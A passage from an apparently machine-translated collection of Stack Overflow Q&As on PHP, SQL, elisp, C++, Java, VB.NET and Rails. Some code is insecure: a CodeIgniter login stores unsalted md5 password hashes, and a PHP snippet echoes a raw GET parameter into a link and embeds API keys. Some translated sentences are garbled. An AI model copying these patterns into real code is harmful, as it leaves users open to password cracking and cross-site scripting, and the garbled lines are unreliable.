        if ( $username == "" || $password == "" )
            return FALSE;

        $hashed_password = md5( $password ); 

        $this->db->where($users->user, $username );
        $this->db->where($users->pass, $hashed_password );

        $query = $this->db->get($users->name);

        if ( $query->num_rows() > 0 )
            return TRUE;
        return FALSE;
    }

    /*
     * Slide de destacados de la pagina principal.
     * no creo que necesitemos mas que esto
     */

    function imagenes_slide ( $id = -1 )
    {
        global $img_slide;
        if ( $id == -1 )
            $this->db->where( 'id', $id);
        $query = $this->db->get( $img_slide->name);

        return $query->result_array();
    }

    function borrar_imagen_slide( $id )
    {
        global $img_slide;
        $image_to_delete = $this->imagenes_slide( $id );

        $this->db->where('id', $id);
        $this->db->delete($img_slide->name);

        return $image_to_delete[0][$img_slide->url];
    }

    function agregar_imagen_slide( $url )
    {
        global $img_slide;
        $this->db->insert( $img_slide->name, array( $img_slide->url => $url ));
    }

    function cambiar_imagen_slide ( $id, $url )
    {
        global $img_slide;
        $this->db->where( 'id', $id );
        $this->db->update( $img_slide->name, array( $img_slide->url, $url ) );
    }

    /*
     * Url del catalogo.
     */

    function url_catalogo( $id = -1 )
    {
        global $catalogo;
        if ( $id !== -1 )
            $this->db->where( 'id', $id );

        $query = $this->db->get( $catalogo->name );
        return $query->result_array();
    }

    function add_catalogo ( $url )
    {
        global $catalogo;
        $this->db->insert( $catalogo->name, array( $catalogo->url, $url) );
    }

    function remove_catalogo ( $id )
    {
        global $catalogo;
        $url_catalogo = $this->url_catalogo( $id );

        $this->db->where( 'id', $id );
        $this->db->delete( $catalogo->name );

        # Es solo que queremos el primero, ya que buscamos por id
        # y este es unico.
        return $url_catalogo[0][$catalogo->url];
    }

    function update_catalogo ( $id, $url )
    {
        global $catalogo;
        $this->db->where( 'id', $id );
        $this->db->update( $catalogo->name, array( $catalogo->url, $url ) );
    }

    /*
     * Marcas.
     */

    function get_marcas ( $id = -1)
    {
        global $marcas;
        if( $id !== -1 )
            $this->db->where( 'id', $id );
        $query = $this->db->get( $marcas->name );
        return $query->result_array();
    }   

    function add_marca ( $titulo, $url )
    {
        global $marcas;
        $n = array( $marcas->titulo => $titulo, $marcas->url => $url );
        $this->db->insert( $marcas->name, $n );
    }

    function remove_marca ( $id )
    {
        global $marcas;
        # Get the url to delete the image
        $url_to_delete = $this->get_marcas( $id );

        $this->db->where( 'id', $id );
        $this->db->delete( $marcas->name );

        # Es solo que queremos el primero, ya que buscamos por id
        # y este es unico.
        return $url_to_delete[0][$marcas->url];
    }

    function update_marca ( $id, $titulo = FALSE, $url = FALSE )
    {
        global $marcas;
        $to_update = array ();

        if ( $titulo != FALSE )
            $to_update[$marcas->titulo] = $titulo;
        if ( $url != FALSE )
            $to_update[$marcas->url] = $url;

        if ( $to_update !== array() )
        {
            $this->db->where( 'id', $id );
            $this->db->update($marcas->name, $to_update );
        }
    }

    /*
     * Categorias!
     */
    function get_categorias ( $id = -1 )
    {
        global $categorias;
        if ( $id != -1 )
            $this->db->where('id', $id);
        $query = $this->db->get( $categorias->name );
        return $query->result_array();
    }

    function remove_categoria ( $id )
    {
        global $categorias;
        # Conseguimos todos los items de las categorias.
        $novedades = $this->get_novedades( $id );
        foreach( $novedades as $novedad )
        {
            $this->delete_novedad ( $novedad["id"] );
        }

        $this->db->where( 'id', $id );
        $this->db->delete( $categorias->name );
    }

    function add_categoria ( $titulo )
    {
        global $categorias;
        $data = array( $categorias->titulo, $titulo );
        $this->db->insert ($categorias->name, $data);
    }

    function update_categoria ( $id, $titulo )
    {
        global $categorias;
        $this->db->where( 'id', $id);
        $this->db->update( $categorias->name, array( $categorias->titulo, $titulo ) );
    }

    /*
     * Novedades ! (Esto va a ser largo)
     */

    function get_novedades ( $id_categoria, $id_novedad = FALSE, $offset = FALSE )
    {
        global $novedades;
        $this->db->where( $novedades->categoria, $id_categoria );
        if ( $id_novedad !== FALSE )
            $this->db->where ( 'id', $id_novedad );
        if ( $offset !== FALSE )
            $this->db->limit( 10, $offset );
        $query = $this->db->get( $novedades->name );

        return $query->result_array();
    }

    function add_novedad ( $titulo, $descripcion, $id_categoria )
    {
        global $novedades;
        # Hay que crear la fecha actual.
        $date = new Date();

        $to_add = array (
            $novedades->titulo  => $titulo,
            $novedades->fecha   => $date,
            $novedades->descripcion => $descripcion,
            $novedades->categoria   => $id_categoria
        );
        $this->db->insert( $novedades->name, $to_add );
    }

    function delete_novedad ( $id )
    {
        global $novedades;

        # Y ahora sacamos de la base de datos.
        $this->db->where( 'id', $id );
        $this->db->delete( $novedades->name );

        # Retornamos todas las urls de las imagenes.
    }

    function update_novedad ( $id, $titulo = FALSE, $descripcion = FALSE )
    {
        global $novedades;
        $to_update = array();
        $this->db->where ( 'id' , $id );
        if ( $titulo != FALSE )
            $to_update[$novedades->titulo] = $titulo;
        if ( $descripcion != FALSE )
            $to_update[$novedades->descripcion] = $descripcion;

        if ( $to_update === array() )
            return FALSE;
        $this->db->update( $novedades->name, $to_update );
    }

    /*
     * Aca van las imagenes de las novedades.
     */

    function get_images_novedad ( $id_novedad, $amount = 0 )
    {
        global $img_nov;
        if ( $amount != 0 )
            $this->db->limit( $amount );
        $this->db->where( $img_nov->novedad, $id_novedad );
        $query = $this->db->get( $img_nov->name );

        return $query->result_array();
    }

    function delete_imagen_novedad ( $id )
    {

        global $img_nov;
        # Primero que nada, eliminamos todas las imagenes. :)
        $images = $this->get_imagenes_novedad ( $id );
        $to_delete_permantenlty = array();
        foreach ( $images as $image )
        {
            $to_delete_permantenlty[] = $image[$img_nov->url];
        }

        $this->db->where( $img_nov->novedad, $id );
        $this->db->delete( $img_nov->name );
        return $to_delete_permantenlty;
    }

}
/* End of Model class */ 
```

我想在模型中查看全局范围内的对象。我已经尝试了很多方法来做到这一点。但没有办法。

当我访问没有意义的模型时，这是错误的。

```
Message: Trying to get property of non-object 
```

PD：我不想要替代品。我知道替代方案，我可以在 10 分钟内使其工作:) 我只是好奇这是否可以工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:59:40.120

你不能，这是不可能的，甚至 Chuck Norris 也不能访问**类定义**中的全局变量。
当您需要这些对象时，您必须将它们传递给构造函数或方法。想一想：OOP 背后的整个想法是编写一次代码，它可以部署在任何地方，如果该代码依赖于一个名为 $foo 的全局变量，要在全局范围内定义，那么您的代码*就不能*被重用，除非全局范围具有所需的对象，具有这些特定的名称...如果允许，OOP 代码将很难调试：目前，如果您收到错误说未定义，在第 x 行class 文件，你知道你正在尝试访问一个属性。想象一下，不得不遍历每一行代码，才发现你写的是：$foo 而不是全局 $foo

*额外：*
只是想到了一种让它工作的hacky方法：将对象分配给超级全局变量（如$_GLOBALS）将为您提供访问权限（可以从类中访问超级全局变量）。但这只是一种糟糕的做法并且*非常*容易出错：每个类都可以访问这些对象，并且可能重新分配或更改数据，因此您无法保证这些对象仍然存在......

坦率地说，如果您需要访问全局变量，您最好花时间考虑一下您*真正*想要做什么。为了你，也为了每个人，你最好选择，要么写所有的面向对象，要么什么都不写。将两者混合在一起最终只会让您感到悲伤。

既然您使用的是 codeigniter，为什么不花时间了解一下该框架，并按预期使用它。这样，您就可以避免重新发明轮子，毕竟：这就是框架的用途：它们为您提供了一个（相当）发达的主干，可以完成所有繁重和琐碎的工作，因此您不必这样做。
只需使用框架并查看 MVC 模式，这就是我要做的......

*编辑：*
你得到的错误是绝对有意义的：访问非对象的属性是可以预期的，因为你不能使用全局变量。PHP 有这种*错误*的倾向，并试图让它全部工作，所以它可能为你定义了一个局部变量，它（因为它没有被初始化将被分配 NULL），null 不是一个对象，所以你可以'不访问属性。因此：访问非对象的属性。

 **正如@fireeyedboy 向我指出的那样**更正，可以这样做（检查注释以获取指向键盘的链接）。**我仍然认为这是一种糟糕的编码方式，甚至会称之为错误，需要尽快解决。
如果我曾经看到过与氰化物药丸等效的代码，就是这样。编写 OO 代码，只有在某些全局变量存在的情况下才能工作，这是对人类的犯罪！**

# sql - 返回缺失记录的 t-sql 查询

> ID：14074911
> 
> 赞同：1
> 
> 时间：2012-12-28T19:47:46.643
> 
> 标签：sql, tsql, left-join, missing-data

我有一个查询 (ContactFormTypesRequired)，它使用下面未显示的相关表返回 ContactID 和 FormTypeID。这是一个表单类型列表，每个联系人都应该将其作为表单关联起来。

我需要一个查询，该查询返回不具有上述查询中指定的 FormTypes 的一种或多种相关形式的联系人。

我尝试了从 Form 到 FormTypeID 上的 ContactsFormTypesRequired 的左外连接，但结果没有考虑到每个特定联系人应具有的 FormType。

请让我知道，如果你有任何问题。

提前感谢您的任何建议。

![图式](../Images/bcb9b4da1edd88520e3ecf2cf57745f7.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T21:03:48.467

我正在以这种方式编写查询。这首先从您的查询开始以获取所需的表单作为 CTE，然后将它们交叉连接到联系人以获取每个所需的组合，然后再加入实际的表单。

```
with NeededForms (<yourqueryhere>)
select distinct c.*
from Contact c cross join
     NeededForms nf left outer join
     Form F
     on nf.FormTypeId = f.FormTypeId left outer join
     ContactForm cf
     on c.ContactId = cf.ContactId and
        f.FormId = cf.FormId
where cf.FormId is null 
```

我正在这样做，因此您可以使用非常相似的查询来回答缺少哪些表单的查询：

```
with NeededForms (<yourqueryhere>)
select c.*, nf.FormTypeId
from Contact c cross join
     NeededForms nf left outer join
     Form F
     on nf.FormTypeId = f.FormTypeId left outer join
     ContactForm cf
     on c.ContactId = cf.ContactId and
        f.FormId = cf.FormId
where cf.FormId is null 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:08:26.230

使用 NOT IN Cluase 试试这个简单的查询：

```
SELECT * FROM Contact
WHERE ContactID IN 
(SELECT ContactID FROM ContactForm 
INNER JOIN FORM ON ContactForm.FormID=Form.FormID
WHERE FormTypeID=@FormTypeID) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-03T20:51:55.603

我创建了 ContactFormTypeExist：

```
SELECT DISTINCT Contact.ContactID, Form.FormTypeID
FROM Contact 
    INNER JOIN ContactForm 
        ON Contact.ContactID = ContactForm.ContactID 
    INNER JOIN Form 
        ON ContactForm.FormID = Form.FormID 
```

然后将上面问题中描述的 ContactFormTypesRequired 加入到带有外部连接的 ContactFormTypeExist 中，为我提供缺少相关 FormTypeID 的 ConactID：

```
SELECT ContactFormTypesRequired.ConactID
FROM ContactFormTypeExist 
    RIGHT JOIN ContactFormTypesRequired 
        ON (ContactFormTypeExist.FormTypeID = ContactFormTypesRequired.FormTypeID) 
            AND (ContactFormTypeExist.ConactID = ContactFormTypesRequired.ConactID)
WHERE (((ContactFormTypeExist.ConactID) Is Null)); 
```

这将返回联系人缺少其 ContactType 所需的 FormTypes 的所有 ContactID。

# elisp - 如何从流程输出中删除换行符？

> ID：14074912
> 
> 赞同：14
> 
> 时间：2012-12-28T19:47:47.867
> 
> 标签：elisp

我调用 git get the toplevel dir （根据 [Is there a way to get the git root directory in a command?](https://stackoverflow.com/questions/957928/is-there-a-way-to-get-the-git-root-directory-in-one-command) ）。

```
(let ((tmpbuffer (get-buffer-create (make-temp-name "git"))))
  (call-process "git" nil tmpbuffer nil "rev-parse" "--show-toplevel")
  (with-current-buffer tmpbuffer
    (with-output-to-string
      (princ (buffer-string))
      (kill-buffer)))) 
```

但是返回的字符串中有一个尾随换行符。我不知道如何摆脱它。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-28T20:33:20.320

我认为你可以做到

```
(replace-regexp-in-string "\n$" "" 
              (shell-command-to-string "git rev-parse --show-toplevel")) 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-04-21T15:54:40.497

如果您只想在输出的最后删除换行符，请使用

```
(replace-regexp-in-string "\n\\'" "" 
  (shell-command-to-string "git rev-parse --show-toplevel")) 
```

接受的答案还用`"\n\n"`单个换行符 () 替换输出中的换行符对 ( `"\n"`)，因为`$`匹配字符串末尾或换行符之后，而`\\'`仅匹配字符串末尾。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2019-02-03T14:07:38.107

假设它存储在一个变量`output-string`中，最后的换行符可以这样删除：

```
(substring output-string 0 -1) 
```

使用这种`shell-command`方式，它看起来像这样：

```
(substring
  (shell-command-to-string "git rev-parse --show-toplevel")
  0 -1) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2020-04-10T05:44:14.587

如果你对*很棒*的外部包没问题。

使用[s-trim](https://github.com/magnars/s.el#s-trim-s)

```
ELISP> (shell-command-to-string "light -G")
"60.00\n"

ELISP> (s-trim (shell-command-to-string "light -G"))
"60.00" 
```

# c++ - boost::asio::write 时出错

> ID：14074914
> 
> 赞同：1
> 
> 时间：2012-12-28T19:47:59.187
> 
> 标签：c++, sockets, boost

我使用 boost:asio 来处理套接字。但是我在使用函数时出错`boost::asio::write`，这里是我的代码：

```
tcp::socket socket_;

Server(boost::asio::io_service& io_service) :  socket_(io_service) {}

tcp::socket& socket()
{
    return socket_;
}

void Server::start()
{
    startReadPacket(10); // example, client sends 10 bytes packet
}

void Server::startReadPacket(int size_to_read)
{
    boost::asio::async_read(socket(), boost::asio::buffer(byteBuffer->GetBytes(), MAX_BUFFER_SIZE), boost::asio::transfer_at_least(size_to_read), boost::bind(&Server::handle_read, this, boost::asio::placeholders::error, boost::asio::placeholders::bytes_transferred));
}

void Server::handle_read(const boost::system::error_code& error, size_t bytes_transferred)
{
    unsigned char data[2] = { 0x01, 0x24}; //for example
    boost::asio::write(socket(), boost::asio::buffer(data, 2)); // this code throws exception below
} 
```

错误：

```
>   NewServer.exe!boost::throw_exception<boost::system::system_error>(const boost::system::system_error & e)  Line 61 + 0x2e bytes  C++
    NewServer.exe!boost::asio::detail::do_throw_error(const boost::system::error_code & err, const char * location)  Line 38 + 0xd bytes    C++
    NewServer.exe!boost::asio::write<boost::asio::basic_stream_socket<boost::asio::ip::tcp,boost::asio::stream_socket_service<boost::asio::ip::tcp> >,boost::asio::mutable_buffers_1>(boost::asio::basic_stream_socket<boost::asio::ip::tcp,boost::asio::stream_socket_service<boost::asio::ip::tcp> > & s, const boost::asio::mutable_buffers_1 & buffers)  Line 62    C++
    NewServer.exe!Server::handle_read(const boost::system::error_code & error, unsigned int bytes_transferred)  Line 91 + 0x26 bytes    C++ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T20:54:47.577

提供的示例代码中没有 TCP 连接调用。该错误可能来自尝试写入未连接的套接字。在服务器的情况下，`accept`需要一个。（如果套接字初始化发生在您未显示的某些代码中，请忽略这一点）。

`async_read`将异步调用（例如）与阻塞调用（例如 ）混合使用是非常少见的`write`。选择异步或阻塞调用并且不要混合使用它们是一种很好的做法。

您不检查`handle_read`. 如果失败，`async_read`阻塞也很可能失败。阻塞将在失败时抛出异常。`write``handle_read``write`

我建议研究 asio 文档中的示例。

# google-chrome-extension - 将远程 XML 文件下载到扩展中

> ID：14074917
> 
> 赞同：0
> 
> 时间：2012-12-28T19:48:16.757
> 
> 标签：google-chrome-extension

是否可以将远程 XML 文件作为“数据库更新”下载*到扩展包中？*是否有参考链接或经过验证的方法？

我知道 Ad-Blocker Plus 能够更新简单的过滤器。这是同一个概念吗？关于如何做到这一点的任何想法？

谢谢

# xml - JSTL 从字符串变量导入/加载 xml 文档

> ID：14074928
> 
> 赞同：0
> 
> 时间：2012-12-28T19:49:08.707
> 
> 标签：xml, jsp, jstl

在 JSP 页面中，使用 JSTL 我可以加载一个 xml 文件，从 xml 文件路径或 url 到 jstl 变量，如下所示：

```
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>  
<c:import url="my.xml" var="xmldocument"/> 
```

现在，如果我的 xml 文件位于字符串变量而不是文件系统中，我该如何做完全相同的事情？

说我有

```
<%
String strXmlDoc = "<books><book><name>Padam History</name><author>ZARA</author><price>100</price></book></books>";
%> 
```

如何将其导入 jstl var“xmldocument”？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T21:18:10.237

怎么样：

```
<c:set var="xmldocument"><books><book><name>Padam History</name><author>ZARA</author><price>100</price></book></books></c:set> 
```

# vb.net - IEquityComparer 到 '=' 重载器

> ID：14074929
> 
> 赞同：0
> 
> 时间：2012-12-28T19:49:10.533
> 
> 标签：vb.net

我的问题是为了我的一般理解，这不是问题，以下是我项目中的演示类：

```
 Public Class Registration
        Inherits HumanBase

        Private _NameeValue As HumanName
        Property Namee As HumanName
            Get
                Return _NameeValue
            End Get
            Set(ByVal Value As HumanName)
                If Not _NameeValue = Value Then
                    _NameeValue = Value
                    OnPropertyChanged("Namee")
                End If
            End Set
        End Property
        Private _UserPasswordValue As String
        Public Property UserPassword() As String
            Get
                Return _UserPasswordValue
            End Get
            Set(ByVal value As String)
                If Not _UserPasswordValue.Equals(value) Then
                    _UserPasswordValue = value
                    OnPropertyChanged("UserPassword")
                End If
            End Set
        End Property

        Private _UserEmailValue As String
        Public Property UserEmail() As String
            Get
                Return _UserEmailValue
            End Get
            Set(ByVal value As String)
                If Not _UserEmailValue = value Then
                    _UserEmailValue = value
                    OnPropertyChanged("UserEmail")
                End If

            End Set
        End Property

        Property UserPassword2 As String
    End Class
Public Class HumanName
        Inherits HumanBase
        Implements IComparable(Of HumanName)
        Implements IEqualityComparer(Of HumanName)

#Region "Private Variables"
        Private _TitleNameValue As CommonTypes.TitleName
        Private _FirstNameValue As String
        Private _MiddleNameValue As String
        Private _LastNameValue As String
        Private _SuffixNameValue As CommonTypes.Suffixname
#End Region

#Region "Property Variables"
        Property TitleName As CommonTypes.TitleName
            Get
                Return _TitleNameValue
            End Get
            Set(ByVal Value As CommonTypes.TitleName)
                If Not _TitleNameValue = Value Then
                    _TitleNameValue = Value
                    OnPropertyChanged("TitleName")
                End If
            End Set
        End Property
        Property FirstName As String
            Get
                Return _FirstNameValue
            End Get
            Set(ByVal Value As String)
                If Not _FirstNameValue = Value Then
                    _FirstNameValue = Value
                    OnPropertyChanged("FirstName")
                End If
            End Set
        End Property
        Property MiddleName As String
            Get
                Return _MiddleNameValue
            End Get
            Set(ByVal Value As String)
                If Not _MiddleNameValue = Value Then
                    _MiddleNameValue = Value
                    OnPropertyChanged("MiddleName")
                End If
            End Set
        End Property
        Property LastName As String
            Get
                Return _LastNameValue
            End Get
            Set(ByVal Value As String)
                If Not _LastNameValue = Value Then
                    _LastNameValue = Value
                    OnPropertyChanged("LastName")
                End If
            End Set
        End Property
        Property SuffixName As CommonTypes.Suffixname
            Get
                Return _SuffixNameValue
            End Get
            Set(ByVal Value As CommonTypes.Suffixname)
                If Not _SuffixNameValue = Value Then
                    _SuffixNameValue = Value
                    OnPropertyChanged("SuffixName")
                End If
            End Set
        End Property
#End Region

        Public Function CompareTo(ByVal other As HumanName) As Integer Implements System.IComparable(Of HumanName).CompareTo
            Return True
        End Function

        Public Function Equals1(ByVal x As HumanName, ByVal y As HumanName) As Boolean Implements System.Collections.Generic.IEqualityComparer(Of HumanName).Equals
            Return True
        End Function

        Public Function GetHashCode1(ByVal obj As HumanName) As Integer Implements System.Collections.Generic.IEqualityComparer(Of HumanName).GetHashCode
            Return True
        End Function
    End Class 
```

代码在编码时本身在“ `If Not _NameeValue = Value Then`”处出错，错误是`Error Operator '=' is not defined for types 'SharesCommCodeLib.Human.HumanName' and 'SharesCommCodeLib.Human.HumanName'`。

你能告诉我为什么当我同时实现 ICOPAREABLE 和 IEquitableComparer 时 '=" 不起作用。DotNet 不会考虑将它用于运算符重载吗？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:56:00.437

1.  我强烈建议设置[`OPTION STRICT`为 ON](http://msdn.microsoft.com/en-us/library/zcd4xwzs%28v=vs.80%29.aspx)`Boolean` ，当您尝试从签名定义`Integer`为返回类型的方法返回 a 时，您的代码甚至不会编译。这有助于避免错误
2.  该`IEqualityComparer`接口用于定义您自己的相等定义，并且可以在该接口用于指定相等的任何地方使用，例如在 的构造函数中`Hashtable`，`NameValueCollection`或`OrderedDictionary`
3.  如果要`=`在自定义类型上使用运算符，则需要[**重载它**](http://msdn.microsoft.com/en-us/library/ms379613%28v=vs.80%29.aspx)：

* * *

```
Public Shared Operator =(ByVal humanName1 As HumanName, ByVal humanName2 As HumanName) As Boolean
    Return humanName1._FirstNameValue.Equals(humanName2._FirstNameValue) AndAlso _
        humanName1._MiddleNameValue.Equals(humanName2._MiddleNameValue) AndAlso _
        humanName1._LastNameValue.Equals(humanName2._LastNameValue)
End Operator

Public Shared Operator <>(ByVal humanName1 As HumanName, ByVal humanName2 As HumanName) As Boolean
    Return Not humanName1 = humanName2
End Operator 
```

# c# - 如何在 C# 的指定区域中添加组合框？

> ID：14074930
> 
> 赞同：0
> 
> 时间：2012-12-28T19:49:10.670
> 
> 标签：c#, winforms, custom-controls

我有一系列控件，它们是下拉式组合框、3 个标签和 3 个文本框。我想在按钮单击事件中做到这一点，一组新的这些控件正好在它下面列出。添加时，每个新文本框和组合框都需要各自的名称。我在想这个事件可以检查它上面是否有任何东西，如果是真的，它将把它放在现有控件的下面，但我不知道该怎么做。我还想知道如何做到这一点，以便在添加新信息时扩展 windows 窗体，允许用户输入任意数量的控件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:52:20.143

这个问题有点难以理解，但我认为你需要做两件事：

1.  使这个（组合框、3 个标签、3 个文本框）控件集成为一个独立的[用户控件](http://msdn.microsoft.com/en-us/library/aa302342.aspx)。您将添加允许您从子控件获取/设置信息的属性。

2.  以编程方式将这些用户控件（在按钮单击等上）添加到 a[`FlowLayoutPanel`](http://msdn.microsoft.com/en-us/library/system.windows.forms.flowlayoutpanel.aspx)以使它们在屏幕上保持井井有条。将它们的引用保存在 a`List`或某个东西中，以便您可以通过 1 中提到的属性访问它们中的数据。

有很多关于[如何使用 FlowLayoutPanel](https://www.google.com/search?q=how%20to%20use%20flowlayoutpanel)的信息。

# java - 其他组件从 JInternalFrame 下泄漏

> ID：14074931
> 
> 赞同：1
> 
> 时间：2012-12-28T19:49:15.257
> 
> 标签：java, swing, netbeans, jinternalframe

首先，我遇到了层排序问题，这使我的 JInternalFrame 出现在其他组件下。不过，在将 z-order 设置为 0 后，此问题已很快得到解决。

经过少量测试后，我意识到，当鼠标悬停在按钮或表格单元格等其他组件上时，它会“泄漏”到我的 JInternalFrame 上，以某种方式部分失去焦点，如提供的图像所示。[内容泄露](http://screenshu.com/static/uploads/temporary/k6/rg/9w/vkfuai.jpg)

我以这种方式添加我的新框架：

```
 JInternalFrame my = new JInternalFrame( "..", true, true, false, false );
    this.getContentPane().add(my,0);
    my.setSelected(true);
    my.setVisible(true);
    my.toFront(); 
```

解决这个问题的最简单方法是什么？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T20:02:36.507

始终将 a 添加`JInternalFrame`到 a`JDesktopPane`而不是直接添加到 a `JFrame`。

从[如何使用内部框架](http://docs.oracle.com/javase/tutorial/uiswing/components/internalframe.html)

> 通常，您将内部框架添加到桌面窗格。反过来，桌面窗格可以用作 JFrame 的内容窗格。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T20:00:10.390

不要更改 z 顺序，而是 - 在 add 方法中，使用：

```
this.getContentPane().add(my, new Integer(0)); 
```

（假设`getContentPane()`是指一个`JDesktopPane`）

该`int`方法，完全是别的东西。由于存在这种情况，因此不会进行自动装箱...

# .net - 如何打印派生 .NET 类的列表？

> ID：14074935
> 
> 赞同：0
> 
> 时间：2012-12-28T19:49:57.473
> 
> 标签：.net, visual-studio-2010, code-analysis

我正在计划将大型代码库从 CSLA 迁移到实体框架，我需要对工作范围进行一些分析。因此，给定一个 Visual Studio 解决方案（或一组 .NET 程序集），我需要能够找到从给定基类（例如 BusinessBase）派生的所有类。我的主要要求是我能够将此列表复制到文本文件中。

有没有具有此功能的免费工具？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:16:12.887

在代码中执行此操作的相对简单的方法不是：

```
var derivedTypes = from t in Assembly.GetAssembly("BusinessObjects").GetTypes()
                   where t.IsSubclassOf(typeof(BusinessBase))
               select t; 
```

# php - SimpleXML parse error

> ID：14074936
> 
> 赞同：0
> 
> 时间：2012-12-28T19:50:06.100
> 
> 标签：php, xml, simplexml

```
<a href="http://maps.apple.com/?ll=<?php echo $_GET[q] ?>" style="text-
decoration:none;color:gray;"><div class="box" style="position:absolute;top:0px;left:0px;font-family:Lato;"><span style="float:left;">Directions</span><span style="color:#F2473F;float:right;">About <?php
$lat = $_GET['lat'];
$long = $_GET['long'];
$q = $_GET['q'];
$mysongs = simplexml_load_file('http://www.mapquestapi.com/geocoding/v1/address?key=Fmjtd%7Cluuan1urn9%2Cb0%3Do5-968206&location=' . $q . '&callback=renderGeocode&format=xml');
$lat2 = $mysongs->results[0]->result[0]->result[0]->locations[0]->location[0]->latLng[0]->lat;
$long2 = $mysongs->results[0]->result[0]->result[0]->locations[0]->location[0]->latLng[0]->lng;
$mysongs4 = simplexml_load_file('http://www.mapquestapi.com/directions/v1/route?key=Fmjtd%7Cluuan1u2nh%2C2a%3Do5-96rw5u&from=' . $lat . ',' . $long . '&to=' . $lat2 . ',' . $long2 . '&callback=renderNarrative&outFormat=xml');
$vari = $mysongs4->route[0]->time;
$vari = $vari / 60;
echo round($vari);
?> minutes</span><br></div> 
```

What did I do wrong? The variables $lat2 and $long2 are empty. When I print_r $mysongs, it says that the API key is wrong, which it isn't, and it returns a 403 error.

I'm pretty sure that this is a problem in the way I sent the URI in $mysongs, (cause I've had a similar problem before with the same API), but I'm not quite sure where.

The request I'm doing is ?q=19540 Jamboree Rd Ste 200 Irvine, CA&lat=33.852471&long=-117.7325256 .

Thanks you so much!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:59:48.570

This tested out perfectly for me. Maybe start with this as a basis and build up from there. [http://www.laprbass.com/RAY_temp_solene.php](http://www.laprbass.com/RAY_temp_solene.php)

```
<?php // RAY_temp_solene.php
error_reporting(E_ALL);
echo "<pre>";

// API KEYS
require_once('api.php');

// REQUEST VARIABLES SIMULATED HERE
$qadr = urlencode('19540 Jamboree Rd Ste 200 Irvine, CA');
$qlat = 33.852471;
$qlng = -117.7325256;

// CALL THE MAPQUEST SERVICE
$mysongs = simplexml_load_file('http://www.mapquestapi.com/geocoding/v1/address?key=' . MAPQUEST_API . '&location=' . $qadr . '&callback=renderGeocode&format=xml');

// SHOW THE RESPONSE
var_dump($mysongs);

// ISOLATE THE GEOCODE OF THE RESPONSE
$lat = (string)$mysongs->results->result->locations->location->latLng->lat;
$lng = (string)$mysongs->results->result->locations->location->latLng->lng;

// DO SOMETHING ELSE
$mysongs4 = simplexml_load_file('http://www.mapquestapi.com/directions/v1/route?key=' . MAPQUEST_API . '&from=' . $qlat . ',' . $qlng . '&to=' . $lat . ',' . $lng . '&callback=renderNarrative&outFormat=xml');

// SHOW THE RESPONSE
var_dump($mysongs4);

$vari = $mysongs4->route[0]->time;
$vari = $vari / 60;

// THE FINAL DATA WE WANT TO FIND
echo '<h1>';
echo round($vari);
echo '</h1>'; 
```

# ruby-on-rails-3 - 从关联访问属性

> ID：14074937
> 
> 赞同：0
> 
> 时间：2012-12-28T19:50:22.343
> 
> 标签：ruby-on-rails-3, model-view-controller

我有一个客户和发票模型。一个客户有很多发票，一张发票属于一个客户。

```
class Customer < ActiveRecord::Base
 attr_accessible :billing_address, :customer_currency, :email, :first_name, :last_name,    :mobile, :name, :payment_terms, :phase_type, :pays_vat
 validates_presence_of :first_name, :last_name, :mobile, :billing_address, :payment_terms,  :phase_type, :customer_currency

has_many :invoices

validates :email, 
        :presence => true,
        :uniqueness => true, 
        :email_format => true

validates :name, :mobile, :presence => true, :uniqueness => true
end 
```

发票模型是

```
class Invoice < ActiveRecord::Base
belongs_to :customer
attr_accessible :approved_by, :due_date, :invoice_date, :terms, :customer_id, :customer

validates :invoice_date, presence: true
validates :due_date, presence: true
validates :customer, presence: true 
```

我正在尝试创建一个索引页面，其中列出了系统中的所有发票，这将显示发票所属的客户名称。我如何检索它并在我的模型和视图中清楚地描绘它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:00:02.070

我认为您已经创建了客户和发票控制器和视图（如果不这样做的话`generate scaffold`）。然后在**views\invoices\index.html.erb**中列出发票：

```
<table>
  <tr>
    <th>Invoice</th>
    <th>Customer/th>
  </tr>
<% @invoices.each do |invoice| %>
  <tr>
    <td><%= invoice.num %></td>
    <td><%= invoice.customer.first_name %></td>
  </tr>
<% end %>
</table> 
```

当然，你应该`@invoices`在**controllers/invoices_controller.rb中声明**

```
def index
  @invoices = Invoice.includes(:customer).all
end 
```

# java - 弹出数据后如何从堆栈中永久删除数据

> ID：14074938
> 
> 赞同：-5
> 
> 时间：2012-12-28T19:50:21.840
> 
> 标签：java, stack

一旦数据弹出，我想从堆栈顶部永久删除数据

返回堆栈[顶部--]！

但是当我再次调用弹出时，我得到的值与上次弹出的值相同！那么一旦弹出任何提示，如何删除数据！

提前谢谢（需要使用java代码的提示）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:02:45.210

```
public static void main(String args[]) {

    Stack stack = new Stack();

    for (int i = 1; i <= 10; i++) 
        stack.push(new Integer(i));

    while (!stack.empty())
        System.out.print(stack.pop() + " ");

    System.out.println(" No element in stack");
} 
```

这对我来说很好。

# php - php缩略图错误

> ID：14074940
> 
> 赞同：0
> 
> 时间：2012-12-28T19:50:40.840
> 
> 标签：php, image, resize, thumbnails

我正在尝试使用 Php Thumbnail 调整图像大小并显示为缩略图。我不断收到错误消息，“无法显示图像，因为它包含错误”。有谁知道出了什么问题？

```
 <?php  

 require_once('phpthumb2/ThumbLib.inc.php');

    require "db_connection.php"; 

    $iii = 1;

